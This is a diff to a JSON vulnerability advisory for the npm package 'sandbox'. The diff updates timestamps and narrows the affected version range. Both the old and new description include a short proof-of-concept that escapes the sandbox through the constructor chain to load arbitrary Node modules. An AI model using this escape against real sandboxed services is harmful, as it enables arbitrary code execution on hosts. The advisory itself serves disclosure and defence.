@@ -1,6 +1,6 @@
 {
   "Severity": "MODERATE",
-  "UpdatedAt": "2020-08-31T18:35:00Z",
+  "UpdatedAt": "2026-02-02T23:13:22Z",
   "Package": {
     "Ecosystem": "NPM",
     "Name": "sandbox"
@@ -26,12 +26,12 @@
         "Value": "GHSA-fm4j-4xhm-xpwx"
       }
     ],
-    "Description": "All versions of `sandbox` are vulnerable to Sandbox Escape leading to Remote Code Execution. Due to insufficient input sanitization it is possible to escape the sandbox using constructors.\n\n## Proof of concept\n```\nvar Sandbox = require(\"sandbox\")\ns = new Sandbox()\ncode = `new Function(\"return (this.constructor.constructor('return (this.process.mainModule.constructor._load)')())\")()(\"util\").inspect(\"hi\")`\ns.run(code)\n```\n\n\n## Recommendation\n\nNo fix is currently available. Consider using an alternative module until a fix is made available.",
+    "Description": "All versions of `sandbox` through 0.8.2 are vulnerable to Sandbox Escape leading to Remote Code Execution. Due to insufficient input sanitization it is possible to escape the sandbox using constructors.\n\n## Proof of concept\n```\nvar Sandbox = require(\"sandbox\")\ns = new Sandbox()\ncode = `new Function(\"return (this.constructor.constructor('return (this.process.mainModule.constructor._load)')())\")()(\"util\").inspect(\"hi\")`\ns.run(code)\n```\n\n\n## Recommendation\n\nNo fix is currently available. Consider using an alternative module until a fix is made available.",
     "Origin": "UNSPECIFIED",
     "PublishedAt": "2020-09-02T15:51:34Z",
     "Severity": "MODERATE",
     "Summary": "Sandbox Breakout / Arbitrary Code Execution in sandbox",
-    "UpdatedAt": "2023-01-09T05:04:04Z",
+    "UpdatedAt": "2026-02-02T23:13:22Z",
     "WithdrawnAt": "",
     "CVSS": {
       "Score": 0,
@@ -43,7 +43,7 @@
       "FirstPatchedVersion": {
         "Identifier": ""
       },
-      "VulnerableVersionRange": "\u003e= 0.0.0"
+      "VulnerableVersionRange": "\u003e= 0.0.0, \u003c 1.0.0"
     }
   ]
 }
